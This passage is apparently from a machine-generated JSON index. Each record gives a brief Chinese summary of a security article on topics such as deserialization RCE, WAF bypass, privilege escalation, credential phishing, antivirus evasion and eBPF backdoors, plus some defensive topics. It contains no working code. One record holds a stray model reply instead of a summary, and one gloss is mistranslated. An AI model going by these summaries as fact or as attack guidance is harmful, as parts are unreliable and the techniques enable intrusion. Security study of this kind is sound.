格式化器迭代器\n\n<type\n\n'BaseException'>\t\t\t\t\t\t\t\t// 基本异常\n\n<type\n\n'hamt'>\t\t\t\t\t\t\t\t\t\t// 哈姆特\n\n<type\n\n'hamt_array_node'>\t\t\t\t\t\t\t\t// 哈姆特数组节点\n\n<type\n\n'hamt_bitmap_node'>\t\t\t\t\t\t\t\t// 哈姆特位图节点\n\n<type\n\n'hamt_collision_node'>\t\t\t\t\t\t\t// 哈姆特碰撞节点\n\n<type\n\n'keys'>\t\t\t\t\t\t\t\t\t\t// 键\n\n<type\n\n'values'>\t\t\t\t\t\t\t\t\t\t// 值\n\n<type\n\n'items'>\t\t\t\t\t\t\t\t\t\t// 项\n\n<type\n\n'Context'>\t\t\t\t\t\t\t\t\t\t// 上下⽂\n\n<type\n\n'ContextVar'>\t\t\t\t\t\t\t\t\t// 上下⽂变量\n\n<type\n\n'Token'>\t\t\t\t\t\t\t\t\t\t// 令牌\n\n<type\n\n'Token.MISSING'>\t\t\t\t\t\t\t\t// 令牌.丢失\n\n<type\n\n'moduledef'>\t\t\t\t\t\t\t\t\t// 模块定义\n\n<type\n\n'module'>\t\t\t\t\t\t\t\t\t\t// 模块\n\n<type\n\n'filter'>\t\t\t\t\t\t\t\t\t\t// 过滤器\n\n<type\n\n'map'>\t\t\t\t\t\t\t\t\t\t// 映射\n\n<type\n\n'zip'>\t\t\t\t\t\t\t\t\t\t// 压缩\n\n<type\n\n'_frozen_importlib._ModuleLock'>\t\t\t\t\t// 冻结导入库._模块锁\n\n<type\n\n'_frozen_importlib._DummyModuleLock'>\t\t\t\t// 冻结导入库._虚拟模块锁\n\n<type\n\n'_frozen_importlib._ModuleLockManager'>\t\t\t// 冻结导入库._模块锁管理器\n\n<type\n\n'_frozen_importlib.ModuleSpec'>\t\t\t\t\t// 冻结导入库.模块规范\n\n<type\n\n'_frozen_importlib.BuiltinImporter'>\t\t\t\t// 冻结导入库.内置导入器\n\n<type\n\n",
        "FileName": "11090-关于SSTI注入的二三事.pdf"
    },
    {
        "page_content": "该文档详细介绍了如何搭建和测试 vulntarget 漏洞靶场，包括安装和配置 Ubuntu、Apache、PHP、Laravel、XAMPP、CMS 等组件，并提供了针对 Laravel 远程代码执行漏洞、sudo 提权漏洞、内核提权漏洞的测试过程和利用方法。",
        "FileName": "10817-vulntarget漏洞靶场系列（三）— vulntarget-c.pdf"
    },
    {
        "page_content": "ThinkPHP 6.0 反序列化漏洞分析文章探讨了 ThinkPHP 6.0 框架中存在的反序列化漏洞，该漏洞允许攻击者通过精心构造的序列化数据执行任意代码。文章详细分析了漏洞的成因、利用条件和利用过程，并提供了利用代码示例。",
        "FileName": "10396-Thinkphp 6.0 反序列化漏洞分析.pdf"
    },
    {
        "page_content": "SDL（安全开发生命周期）是一种由微软提出的软件开发过程，旨在通过在软件开发的每个阶段（需求分析、设计、编码、测试和维护）集成安全考虑，来构建更安全的软件。SDL 的核心理念是将安全活动嵌入到整个流程中，以减少漏洞数量并降低安全缺陷，从而提高软件的安全性。",
        "FileName": "11922-企业的安全运营——浅析SDL模型.pdf"
    },
    {
        "page_content": "本文分析了 Yii2 框架中 CVE-2020-15148 漏洞的绕过技巧，利用可变函数和可控函数，绕过了反序列化限制，实现了任意函数执行。",
        "FileName": "8352-巧用可变函数 绕过 CVE-2020-15148 限制.pdf"
    },
    {
        "page_content": "F5 BIG-IP 未授权 RCE（CVE-2020-5902）漏洞允许攻击者通过绕过 Apache 和 Tomcat 对 URL 的解析差异，利用多个 JSP 文件中的漏洞，实现未授权任意文件读取、上传和命令执行。该漏洞影响 F5 BIG-IP 15.1.0.4 之前的版本，可以通过修改 alias 劫持 list 命令为 bash 来执行任意系统命令。",
        "FileName": "8014-F5-BIG-IP未授权RCE(CVE-2020-5902).pdf"
    },
    {
        "page_content": "该文档分析了 CVE-2020-2555 漏洞，该漏洞影响 Oracle WebLogic 服务器，允许攻击者通过反序列化恶意数据包来执行远程代码。漏洞存在于 LimitFilter 类中，攻击者可以通过控制参数调用该类中的方法，触发反序列化过程并执行命令。文档提供了漏洞分析、复现步骤和缓解措施，强调了漏洞的严重性以及保护 WebLogic 服务器免受攻击的重要性。",
        "FileName": "8365-cve-2020-2555Oracle Coherence&WebLogic反序列化远程代码执行漏洞分析.pdf"
    },
    {
        "page_content": "该文档分析了 Jira 中的 CVE-2021-26086 漏洞，该漏洞允许攻击者读取任意文件。研究人员通过比较有漏洞和非漏洞版本的文件 MD5 值来定位漏洞，并确定了 CachingResourceDownloadRewriteRule 类中的一个绕过，该绕过允许攻击者在 /s/xxx/_/ 路径后使用特殊字符来读取文件。",
        "FileName": "10109-Jira 文件读取分析（CVE-2021-26086）.pdf"
    },
    {
        "page_content": "本文分析了 CVE-2020-36189（Jackson-databind SSRF&RCE）和 CVE-2020-36186（jackson-databind RCE）漏洞，并提供了两个新的 Gadget，利用 Jackson-databind 的反序列化功能绕过黑名单，导致远程代码执行或服务器端请求伪造。",
        "FileName": "9331-Jackson-databind漏洞两则分析.pdf"
    },
    {
        "page_content": "NoXss 是一款用于批量检测 XSS 漏洞的 Python 脚本工具，它通过“符号闭合”和基于“反射位置”的有效载荷来检测 XSS 隐患，支持 DOM 类型 XSS、多进程和协程并发，并提供与 BurpSuite 协同工作和辅助人工分析的功能。",
        "FileName": "7133-一款适合甲方批量检测xss的工具.pdf"
    },
    {
        "page_content": "该文档分析了 ThinkPHP 5.0.x 框架中反序列化漏洞的利用过程，重点关注了由于 PHP 短标签开启导致的 payload 无法成功执行的问题。作者通过修改 payload 中 model 类的 parent 属性为 public，并使用 IBM1390 过滤器绕过短标签限制，最终成功利用漏洞在目标服务器上执行任意代码。",
        "FileName": "7858-thinkphp5.0.x反序列化之遇到php开启短标签.pdf"
    },
    {
        "page_content": "该文档介绍了在红队评估期间使用钓鱼攻击来获取 Windows 用户凭据的技术。它提供了各种工具和方法，包括 Cobalt Strike、FakeLogonScreen、SharpLocker、CredsLeaker、Phish_windows_credentials 和 lockphish，这些工具可以创建虚假的登录界面或弹出窗口，诱骗用户输入其凭据。",
        "FileName": "7458-用钓鱼攻击Windows凭据.pdf"
    },
    {
        "page_content": "文档探讨了ARP欺骗攻击，这是一种利用ARP协议缺陷的中间人攻击。攻击者通过发送伪造的ARP应答消息，将目标主机的流量重定向到自己的机器，从而窃取数据或进行其他恶意活动。文档还介绍了DNS欺骗和LLMNR欺骗，这两种攻击都利用了DNS和LLMNR协议的漏洞，并提供了防御这些攻击的措施。",
        "FileName": "11974-内网渗透之中间人欺骗攻击.pdf"
    },
    {
        "page_content": "**主题：绕过 Fastjson 漏洞的规则防御**\n\n**内容：**本文介绍了 Fastjson 漏洞的利用过程，包括已知公开的 payload 和基于规则的防御方法。作者通过 fuzzing 成功绕过了防御，并分析了 Fastjson 反序列化过程中的关键方法，最终找到了绕过 payload 的方法。",
        "FileName": "7568-某json 绕墙的Tips.pdf"
    },
    {
        "page_content": "该文档介绍了 Java API 中的 `sun.print.UnixPrintServiceLookup` 类，该类用于查找可用的打印机服务。文档分析了该 API 在不同框架和组件中的影响，并讨论了利用该 API 在 RASP 中进行攻击的技巧。此外，文档还总结了针对该 API 的有效防御措施。",
        "FileName": "12818-Magic In Java API 学习记录.pdf"
    },
    {
        "page_content": "本文介绍了社交工程钓鱼攻击的基本流程，包括准备社交账号、免杀恶意软件、沙箱对抗、信息收集、C2搭建和上线后的操作。该流程旨在帮助攻击者通过社交工程技术获取目标的敏感信息或访问权限。",
        "FileName": "12879-社工钓鱼基本流程.pdf"
    },
    {
        "page_content": "该文档探讨了虚拟机环境检测技术，重点关注虚拟机 (VM) 和容器的检测。它介绍了各种检测方法，包括特权指令检测、IDT 基址检测、LDT 和 GDT 检测、基于 STR 检测、基于注册表检测、基于时间差检测和基于虚拟硬件指纹检测。此外，它还讨论了使用 dmidecode 和 systemd-detect-virt 命令来识别虚拟化技术和区分全虚拟化和容器虚拟化。",
        "FileName": "8922-虚拟机环境检测.pdf"
    },
    {
        "page_content": "该文档主要讨论了 Javaweb 中的权限绕过技术，包括身份信息绕过、密钥硬编码、属性利用、异常绕过、前端认证绕过、配置绕过、过滤绕过和权限管理绕过等多种绕过方式，并提供了具体的利用方法和示例。",
        "FileName": "12709-Javaweb中的权限绕过.pdf"
    },
    {
        "page_content": "该文档描述了利用 Microsoft Exchange 中三个漏洞的攻击链，这些漏洞允许远程攻击者在受影响的服务器上执行任意代码。第一个漏洞是一个未经身份验证的 SSRF，允许攻击者向后端服务发送任意请求。第二个漏洞是一个身份验证绕过，允许攻击者以管理员权限运行 Exchange cmdlet。第三个漏洞是一个任意文件写入，允许攻击者在 OAB 文件夹上编写 webshell。利用这些漏洞，攻击者可以获得对服务器的完全控制。",
        "FileName": "11900-Pwn2Own 2021 Microsoft Exchange 漏洞利用链.pdf"
    },
    {
        "page_content": "**主题：**从 0 开始学习代码审计之百家 CMS\n\n**内容：**本文详细介绍了作者对百家 CMS V4 版本的代码审计过程，发现了多个漏洞，包括文件上传漏洞、任意文件删除漏洞和 SQL 注入 RCE 漏洞。作者通过分析 CMS 的结构、参数获取方式和函数调用，逐步定位并利用了这些漏洞，展示了代码审计的思路和方法。",
        "FileName": "10678-从0开始学习代码审计之百家CMS.pdf"
    },
    {
        "page_content": "该文档分析了 Ripstech Java Security 2019 Calendar 复现系列中的四个漏洞，包括上传功能中的任意文件上传漏洞、会话固定攻击、表达式语言注入漏洞、LDAP 盲注漏洞、Padding Oracle 攻击、格式化字符串漏洞、对象注入漏洞和 SSRF 漏洞。",
        "FileName": "7247-Ripstech Java Security 2019 Calendar复现系列(四).pdf"
    },
    {
        "page_content": "Go 1.18 将 fuzz testing 纳入 go test 工具链，与单元测试、性能基准测试等一起成为 Go 原生测试工具链中的重要成员，Go 也是第一个将模糊测试完全集成到其标准工具链中的主流语言。本文从源码和实践的角度对 go 原生 fuzzing 做了一个简单的介绍。",
        "FileName": "11060-go语言原生模糊测试：源码分析和实战.pdf"
    },
    {
        "page_content": "该文档分析了百家 CMS 中的多个安全漏洞，包括任意文件删除、任意路径删除、远程文件上传和 RCE。这些漏洞允许攻击者删除文件、删除路径、上传恶意文件并执行任意代码，从而对网站造成严重损害。",
        "FileName": "7542-百家cms代码审计.pdf"
    },
    {
        "page_content": "本文介绍了逆向分析 Dialog 公司研制的 DA14531 蓝牙芯片固件的流程，并介绍了几个辅助自动化分析的脚本的实现原理。这些脚本包括：函数参数追踪脚本、任务识别脚本、消息和回调函数交叉引用建立脚本。这些脚本可以帮助分析人员更有效地识别固件中的任务、消息和回调函数，从而简化逆向分析流程。",
        "FileName": "9185-DA14531芯片固件逆向系列（1）-固件加载和逆向分析.pdf"
    },
    {
        "page_content": "该文档记录了对 HackSudo Aliens 靶机的渗透过程，涉及信息收集、MySQL 写入 Webshell、SUID 提权和哈希爆破等技术。渗透者通过扫描内网资产、发现 MySQL 备份文件、利用 MySQL 写入 Webshell、尝试 SUID 提权、爆破哈希、再次尝试 SUID 提权，最终成功获取 root 权限并找到 flag。",
        "FileName": "9613-不定期渗透日记：HackSudo Aliens.pdf"
    },
    {
        "page_content": "该文档分析了彩虹猫病毒，这是一个恶搞病毒，会修改 MBR 主引导扇区，导致 Windows 无法启动，并播放彩虹猫视频。病毒创建多个 MEMZ 进程，并使用各种 API 函数来控制系统，包括改变窗口 GDI、调用外部程序、播放音乐、控制鼠标位置、建立消息循环、设置消息钩子、进程提权和遍历进程。病毒还覆盖 MBR，写入了播放彩虹猫视频的代码，导致系统无法启动。",
        "FileName": "9501-记一次MEMZ样本分析.pdf"
    },
    {
        "page_content": "本文档探讨了使用 ICMP 协议建立隧道以绕过防火墙和 NAT 设备的内网渗透技术。它介绍了 icmpsh、icmptunnel 和 ptunnel 等工具，并提供了在不同场景下的使用示例。此外，本文档还讨论了检测和应对 ICMP 隧道的措施。",
        "FileName": "7875-内网渗透之ICMP隐藏隧道.pdf"
    },
    {
        "page_content": "本文档详细介绍了一次短信验证码攻击的应急响应过程，包括事件确认、攻击动机分析、攻击点分析、制定解决方法、流量统计和封锁 IP 等步骤，并强调了在应急响应中确定攻击者身份和形成书面报告的重要性。",
        "FileName": "8988-一次短信验证码攻击的应急响应.pdf"
    },
    {
        "page_content": "该文档重点介绍了在应急响应中分析 Windows 和 Linux 系统的潜在安全问题，包括检查开机启动项、临时文件、浏览器记录、文件时间属性、进程、计划任务、隐藏帐户、恶意进程、补丁更新、网站 webshell、敏感文件修改、权限、网络连接、登录分析、异常用户、历史文件、计划任务、开机自动项、环境变量和后门排查工具。",
        "FileName": "9365-Hvv前排查分析.pdf"
    },
    {
        "page_content": "该文档探讨了 Java 反序列化的 RMI 和 JNDI 攻击技术，包括 RMI 代理模式、工厂模式、JNDI 注入和 LDAP 协议，并提供了攻击客户端和服务器的示例代码。",
        "FileName": "7900-Java反序列化-RMI&JNDI初探.pdf"
    },
    {
        "page_content": "该文档记录了一次对学校网络的渗透测试，测试者通过信息收集和资产搜集，发现了学校图书馆系统、阅卷系统和继续教育平台中的多个漏洞，包括SQL注入、任意文件上传和逻辑绕过。测试者利用这些漏洞绕过了安全狗，获得了管理员权限和shell，并最终找到了一个具有dba权限的SQL漏洞。",
        "FileName": "9025-记一次对学校的渗透测试.pdf"
    },
    {
        "page_content": "该文档分析了 DLL 劫持的顺序，并提供了使用 C++ 编写 DLL 的示例代码，该 DLL 可以劫持特定函数并执行任意代码。还提供了使用 Python 对 shellcode 进行 XOR 加密的示例代码。",
        "FileName": "12579-dll劫持实例学习.pdf"
    },
    {
        "page_content": "该文档介绍了五种相对罕见的 ASP.NET 免杀方法，包括使用花括号和分号、Unicode 空白连接符、代码块转换、换行特性和 C# /// 注释特性，这些方法可以帮助绕过某些 Web 应用程序防火墙 (WAF) 的检测。",
        "FileName": "10989-几种相对少见的asp.net的免杀方法.pdf"
    },
    {
        "page_content": "本文探讨了如何利用 eBPF（扩展的 Berkeley 数据包过滤器）技术在 Linux 内核中创建隐蔽的后门。eBPF 是一种强大的工具，它允许在内核中运行自定义程序，而无需修改内核本身。通过劫持系统调用和修改目录内容，本文展示了如何使用 eBPF 在目标系统上建立一个隐蔽的后门，该后门不会出现在进程列表中，并且对文件系统没有明显影响。",
        "FileName": "12173-如何借助eBPF打造隐蔽的后门.pdf"
    },
    {
        "page_content": "反序列化漏洞是一种基于序列化和反序列化的操作的漏洞，当反序列化时存在用户可控参数，且反序列化会自动调用一些魔术方法，如果魔术方法内存在敏感操作（如 eval() 函数），且参数是通过反序列化产生的，那么用户就可以通过改变参数来执行敏感操作，从而产生反序列化漏洞。",
        "FileName": "9234-反序列化漏洞详解.pdf"
    },
    {
        "page_content": "该文档主要讨论了如何绕过 Web 应用程序防火墙 (WAF) 来执行 SQL 注入攻击。作者首先介绍了判断后端数据库类型的几种方法，然后描述了如何使用不同的技术来绕过 WAF 的检测，例如修改请求头中的数据格式。作者还强调了绕过 WAF 的难度，并建议使用 SQLmap 等工具来简化该过程。",
        "FileName": "8097-没人比我更懂waf之一点寒芒先到随后枪出如龙.pdf"
    },
    {
        "page_content": "                    ## 文档\n                    该文档分析了 TVT 固件的加解密过程，并提供了两种解密方法。\n\n                    ## 内容\n                    该文档首先介绍了 TVT 固件加解密分析的主题和内容，然后用一段话概括了文档。接下来，文档详细介绍了固件的解压、binwalk 分析、固件加解密分析、xz 压缩包分析、固件文件系统分析、固件解密方法、固件植入后门的尝试、编译 buildroot 的问题解决、固件文件系统打包、固件解密方法总结等内容。最后，文档提供了固件和相关代码的获取链接，并希望得到大神的指点。",
        "FileName": "12850-tvt固件加解密分析.pdf"
    },
    {
        "page_content": "本文探讨了通过对 Windows 中 RPC 方法进行 Fuzz 测试来挖掘尚未修复的漏洞，并利用这些漏洞实现本地提权的方法。作者介绍了 RPC 的概念，并解释了如何使用 RpcView 工具枚举 RPC 服务器。通过对 PetitPotam 的研究，作者展示了如何利用特定 RPC 接口函数来实现本地提权。此外，作者还分享了两个新发现的提权技巧，利用 DiagTrack 服务和 AzureAttestService 服务中的 RPC 接口函数，并提供了相应的工具实现。",
        "FileName": "11313-关于Windows RPC挖掘的那些事.pdf"
    },
    {
        "page_content": "本文档详细介绍了在非域环境下进行大型内网横向渗透的实战案例，包括外网打点、搭建socks代理、内网横向移动（利用意外的来宾账户、一台win2003带来的突破、不局限于SMB和Windows、密码喷洒）、涉及的技术与知识点总结（Shiro反序列化漏洞、PsExec横向移动、Mimikatz和Procdump抓取密码原理、密码喷洒）。",
        "FileName": "11579-记一次授权非域环境下的大型内网横向渗透.pdf"
    },
    {
        "page_content": "该文档记录了一次授权渗透测试，重点介绍了绕过安全狗 WAF 的方法。渗透者尝试了三种绕过方法，包括“=== 绕过”、“去除 \"\" 绕过”和“少 \" 绕过”，最终成功绕过了 WAF，但由于后端的白名单限制，未能获得 shell。文档还分享了渗透过程中使用的插件和工具，以及渗透者的个人使用习惯。",
        "FileName": "8588-记一次文件上传点黑盒测试.pdf"
    },
    {
        "page_content": "该文档介绍了如何绕过安全狗 4.0 的 WAF，包括利用正则表达式缺陷、内联注释、函数名绕过、information_schema.* 绕过等技术，并提供了相应的 tamper 脚本和示例 payload。",
        "FileName": "7449-Bypass安全狗4.0.pdf"
    },
    {
        "page_content": "BinaryFormatter 是 .NET 中用于将对象序列化为二进制流的类，它存在严重的 RCE 漏洞。本文分析了 BinaryFormatter 的反序列化过程，重点介绍了 TextFormattingRunProperties 和 DataSet 两条反序列化利用链。TextFormattingRunProperties 利用链通过修改 ForegroundBrush 字段来触发 XamlReader.Parse()，从而实现 RCE。DataSet 利用链通过设置 DataSet.Tables_0 字段为 TextFormattingRunProperties 生成的字节数组，在反序列化时触发 BinaryFormatter.Deserialize()，从而实现 RCE。此外，本文还介绍了 TypeConfuseDelegate 利用链，该利用链通过修改多播委托的 _invocationList 字段，将 Process.Start() 方法添加到 SortedSet 的比较器中，从而实现命令执行。",
        "FileName": "9593-.net反序列化之BinaryFormatter.pdf"
    },
    {
        "page_content": "该文档描述了 Home Assistant Supervisor 中的一个权限绕过漏洞，该漏洞允许攻击者在未经授权的情况下执行远程代码。该漏洞源于身份验证绕过，攻击者可以通过构造一个特殊路径来绕过身份验证检查，从而访问受保护的 API 端点。该漏洞影响 Home Assistant Supervisor 2023.01.1 之前的版本，已在 2023.2.0 版本中修复。",
        "FileName": "12572-CVE-2023-27482  Home Assistant 权限绕过致远程代码执行漏洞.pdf"
    },
    {
        "page_content": "本文档详细介绍了作者从内网到外网进行批量漏洞挖掘的经历，包括内网信息收集、漏洞扫描、外网爆破、未授权文件上传、提权和漏洞原理分析。作者通过使用各种工具和技术，成功获取了多个目标系统的控制权，并编写了自动化脚本以提高效率。",
        "FileName": "9332-一次从内网到外网，黑盒到白盒的批量挖洞经历.pdf"
    },
    {
        "page_content": "本文探讨了 ASP 代码审计，重点关注前台和后台的漏洞，包括代码执行、SQL 注入、CSRF 和文件相关操作。通过分析源码，作者发现了多个漏洞，包括通过表单直接写入配置信息、直接拼接 SQL 查询、CSRF 攻击以及上传 HTML 文件的可能性。",
        "FileName": "11054-初探asp代码审计.pdf"
    },
    {
        "page_content": "本文档总结了 PHP 原生类在 CTF 中的利用方法，包括 Error、Exception、SoapClient、DirectoryIterator、SimpleXMLElement 等类，介绍了如何利用这些类进行 XSS、反序列化、SSRF、XXE 等攻击。",
        "FileName": "9293-PHP 原生类的利用小结.pdf"
    },
    {
        "page_content": "该文档分析了 CS 的 RCE 利用，重点关注 Swing 中 HTML 的使用。它深入研究了 HTMLDocument 类和 Action 类，并确定了利用 ObjectView 类进行 RCE 的条件。文档还提供了利用 SVGCanvas 类和 setURI 函数加载远程 SVG 文件的示例，并讨论了本地利用和实战利用的步骤。",
        "FileName": "11815-CS的RCE利用研究.pdf"
    },
    {
        "page_content": "该文档分析了 Weblogic 中的 CVE-2020-14644 漏洞，该漏洞允许攻击者通过 T3 协议利用 RemoteConstructor 类中的反序列化漏洞，绕过黑名单过滤，加载任意类并执行恶意代码。文档详细介绍了漏洞的原理、利用方法和修复措施，包括安装补丁、限制 T3 数据包来源和禁用 IIOP 协议。",
        "FileName": "11945-CVE-2020-14644 weblogic RemoteConstructor RCE via T3 protocol.pdf"
    },
    {
        "page_content": "DevSecOps 是一种软件开发方法，它将安全实践集成到 DevOps 流程中，以提高软件系统的安全性。DevSecOps 涉及 10 个阶段，包括计划、创建、验证、预发布、发布、预防、检测、响应、预测和适应。它通过安全编码、安全测试、威胁建模和安全监控等活动，在软件开发的各个阶段识别和解决安全风险，从而在不影响效率的情况下提高软件系统的安全性。",
        "FileName": "12162-企业的安全运营——浅析DevSecOps.pdf"
    },
    {
        "page_content": "Apache Commons Configuration 库中存在一个远程代码执行漏洞，影响版本 2.4 至 2.7。该漏洞允许攻击者通过解析包含任意代码执行插值解析器的字符串来执行任意代码。该漏洞已在 2.8.0 版本中修复，建议受影响用户升级到最新版本。",
        "FileName": "11527-Apache Commons Configuration 远程代码执行.pdf"
    },
    {
        "page_content": "该文档分析了 MySQL 数据库中 UDF（用户自定义函数）的提权技术，介绍了在不同 MySQL 版本和操作系统下利用 UDF 提权的条件和方法，还总结了其他数据库提权方法，如 MOF 提权、启动项提权和 CVE-2016-6663/CVE-2016-6664 利用。",
        "FileName": "10373-数据库MySQL提权.pdf"
    },
    {
        "page_content": "该文档介绍了基于 openresty 开发的安全网关，该网关通过在 nginx 的 access 和 output-body-filter 阶段插入 lua 代码，实现了防御 shiro 反序列化攻击、防御自动化工具请求、保护网站前端代码、防御多源代理请求和防止敏感信息泄漏等功能。",
        "FileName": "10890-基于openresty的安全网关开发记录.pdf"
    },
    {
        "page_content": "该文档详细介绍了如何利用 UsualToolCMS-8.0 中的前台 SQL 注入漏洞来获取后台访问权限，包括漏洞发现、SQLmap 数据提取、后台 getshell 和任意文件读取的利用方法。",
        "FileName": "7033-UsualToolCMS-8.0官方最新版从前台无限制sql注入到后台getshell.pdf"
    },
    {
        "page_content": "WordPress 5.4.2 版本中存在一个存储型 XSS 漏洞 (CVE-2020-4046)，允许经过身份验证的用户通过恶意 JavaScript 代码嵌入帖子内容，影响查看帖子的用户。该漏洞源于 `wp_filter_oembed_iframe_title_attribute()` 函数中对 iframe 标签 title 属性的过滤不当，攻击者可以通过修改 title 属性来注入恶意代码，从而控制目标网站。",
        "FileName": "7929-CVE-2020-4046：WordPress内核存储型XSS分析.pdf"
    },
    {
        "page_content": "Apache Commons JXPath 中的远程代码执行漏洞 (CVE-2022-41852) 允许攻击者通过利用 JXPathContext 类函数处理不受信任的 XPath 表达式来执行任意 Java 代码，从而导致远程代码执行。该漏洞源于 JXPath 对标准 XPath 函数和扩展函数的支持，其中扩展函数允许调用 Java 方法和创建对象，从而使攻击者能够加载远程类并执行代码。",
        "FileName": "11813-Apache Commons JXPath 远程代码执行(CVE-2022-41852).pdf"
    },
    {
        "page_content": "该文档分析了 CVE-2020-0787 漏洞，该漏洞存在于 Windows 后台智能传输服务 (BITS) 中，允许攻击者在 NT AUTHORITY\\SYSTEM 上下文中移动任意文件。该漏洞源于 BITS 中未记录的 QueryNewJobInterface() 方法，该方法允许攻击者获取指向新 IBackgroundCopyJob 接口的指针，从而绕过模拟 RPC 客户端的限制。攻击者可以利用此漏洞将恶意 DLL 移动到受限位置，例如 System32 文件夹，并通过加载该 DLL 来提升权限。",
        "FileName": "7935-CVE-2020-0787-Windows本地提权漏洞分析.pdf"
    },
    {
        "page_content": "该文档分析了两个 Exim 邮件传输代理漏洞，CVE-2019-15846 和 CVE-2018-6789，并详细介绍了如何利用这些漏洞在目标系统上获得代码执行权限。",
        "FileName": "12361-【二进制分析】利用邮件传输代理漏洞到RCE的攻击方法.pdf"
    },
    {
        "page_content": "该文档分析了 ThinkPHP v6.0.7 中的一个反序列化漏洞，该漏洞允许攻击者通过构造一个可控的反序列化点来执行任意代码。攻击者可以通过设置 `$this->lazySave` 为 `true`、`$this->data` 为一个非空数组、`$this->withEvent` 为 `true`、`$this->table` 为一个 `Url` 类实例来触发 `__toString` 魔术方法。然后，攻击者可以通过构造一个调用 `getDomainBind` 方法的 `Validate` 类实例来触发 `__call` 魔术方法，从而调用 `Php` 类中的 `display` 方法，最终执行任意代码。",
        "FileName": "9310-ThinkPHP v6.0.7 eval反序列化利用链.pdf"
    },
    {
        "page_content": "该文档分析了 Java_TemplatesImpl 字节码在 BCEL 和 shiro 中的利用，包括利用 defineClass 方法加载恶意字节码、使用 TemplatesImpl 的 readObject 方法设置恶意属性、使用 TransformerFactoryImpl 对象触发 newTransformer 方法、使用 InvokerTransformer 执行任意 Java 代码等技术。",
        "FileName": "11919-Java_TemplatesImpl字节码在BCEL和shiro中的利用.pdf"
    },
    {
        "page_content": "SystemTap 是一种动态跟踪工具，它利用 Kprobe API 来监控和跟踪正在运行的 Linux 内核，允许用户通过编写脚本来探测内核事件并收集调试信息，从而帮助解决应急排查中遇到的各种问题，例如识别恶意活动、监控文件操作和跟踪网络连接。",
        "FileName": "11764-SystemTap在应急排查中的应用.pdf"
    },
    {
        "page_content": "GSIL 是一款 GitHub 敏感信息采集工具，它通过配置搜索规则，利用 GitHub 的查询接口，在 GitHub 中搜索泄露的敏感信息，如 OSS 存储桶账户密码，并通过邮件发送查询结果。",
        "FileName": "7229-GitHub敏感信息采集工具GSIL.pdf"
    },
    {
        "page_content": "该文档分析了 Apache Commons Collections 3 和 4 中的漏洞，这些漏洞允许通过利用 Java 反序列化机制来执行任意代码。文档详细介绍了漏洞的利用链，包括创建恶意类、实例化 TemplatesImpl 对象、使用 ChainedTransformer 和 TransformingComparator 来触发 transform() 方法的调用，最终导致命令执行。",
        "FileName": "10454-通俗易懂的Java  Commons Collections 3、4分析.pdf"
    },
    {
        "page_content": "该文档分析了 Resin 容器中解析漏洞的原理，该漏洞允许攻击者通过创建包含文本文件的 JSP 文件夹来执行 JSP 代码。漏洞的根源在于 Resin 将以 JSP 结尾的 URL 映射到 JSP Servlet，而该 Servlet 在处理请求时会编译和执行 JSP 代码。通过利用正则表达式中匹配 JSP 文件夹的逻辑缺陷，攻击者可以绕过 Resin 的安全检查，从而执行任意代码。",
        "FileName": "10447-Resin解析漏洞分析.pdf"
    },
    {
        "page_content": "该文档记录了渗透测试中发现的某网站源代码泄露事件，并对泄露的源代码进行了审计。审计结果发现多个高危前台 SQL 注入漏洞，包括在 admin.php 和 ajax.php 中直接拼接用户输入到 SQL 语句中，导致攻击者可以执行任意 SQL 查询。",
        "FileName": "8334-在渗透测试中遇到的某站源代码泄露+代码审计.pdf"
    },
    {
        "page_content": "本文探讨了五种常见的免杀技术，包括 shellcode 加密、函数指针、降低熵值、沙箱绕过和禁用 Windows 事件跟踪 (ETW)。这些技术主要用于静态免杀，其中 C# 搭配静态字符串加密、异或加密、沙箱绕过和 EtwpCreateEtwThread 上线技术，VT 检测结果为 13/68；而 C++ 程序使用 disableETW、shellcode 加密和隐藏导入表的免杀方式，VT 检测结果为 4/68，表明静态免杀相对容易实现。",
        "FileName": "11448-红队开发基础-基础免杀(一).pdf"
    },
    {
        "page_content": "该文档分析了 FastJson 反序列化漏洞的原理和利用方法，包括不同版本的 FastJson 漏洞链、绕过方式和利用示例。漏洞利用点主要集中在 setter 或 getter 方法，通过 JNDI 注入或动态类加载等方式实现远程代码执行。文档还介绍了 FastJson 1.2.25-1.2.47、1.2.42 和 1.4.43 版本的绕过方法。",
        "FileName": "12728-Java反序列化之FastJson反序列化及绕过.pdf"
    },
    {
        "page_content": "本文档介绍了 Cobalt Strike 的特征隐藏技术，包括修改默认端口、生成新证书、设置混淆配置、限制端口访问、使用 Nginx 反向代理、配置 HTTPS 上线和为 Cobalt Strike 配置证书。这些技术旨在隐藏 Cobalt Strike 的特征，使其更难被检测和阻止。",
        "FileName": "9542-CobaltStrike特征隐藏.pdf"
    },
    {
        "page_content": "                    好的，我明白了。我将只输出文档的主题。",
        "FileName": "10075-Java内存攻击技术漫谈.pdf"
    },
    {
        "page_content": "该文档主要介绍了如何利用 CVE-2022-22947 漏洞在 Spring Cloud Gateway 中进行 SPEL 表达式注入和哥斯拉内存马注入，并详细分析了漏洞利用过程，包括利用 SpelExpressionParser 解析 SPEL 表达式、使用 java-object-searcher 工具构造内存马、将恶意过滤器插入到 DefaultWebFilterChain 中等步骤。",
        "FileName": "12388-从CVE-2022-22947学习用java-object-searcher构造哥斯拉马.pdf"
    },
    {
        "page_content": "该文档介绍了如何利用 Java 反序列化漏洞，特别是使用 Commons Collections 5 库，来构造恶意 payload 并执行任意命令。文档详细介绍了漏洞的原理、利用步骤以及如何构造和序列化恶意对象，最终导致远程代码执行。",
        "FileName": "7713-java反序列化学习记录-Common Collections 5.pdf"
    },
    {
        "page_content": "**主题：** JNDI jdk 高版本绕过\n\n**内容：** 文档介绍了 JNDI jdk 高版本绕过的攻击技术，包括通过 RMI 绑定远程对象、通过 LDAP 绑定 Reference、通过本地 Factory 类和 LDAP+反序列化等方法。文中还提供了利用 Apache Druid 的攻击链，通过修改 DruidDataSourceFactory 的 config 函数，在本地发起 JDBC 连接，从而实现命令执行。",
        "FileName": "10656-JNDI jdk高版本绕过—— Druid.pdf"
    },
    {
        "page_content": "该文档主要介绍了 Oracle 数据库注入绕过技术，包括使用全字符 URL 编码、空字符、函数和正则表达式绕过注入检测。文档还提供了绕过注入检测的示例 SQL 语句，并强调了对 SQL 语法的深入了解对于绕过注入至关重要。",
        "FileName": "10347-oracle注入绕狗.pdf"
    },
    {
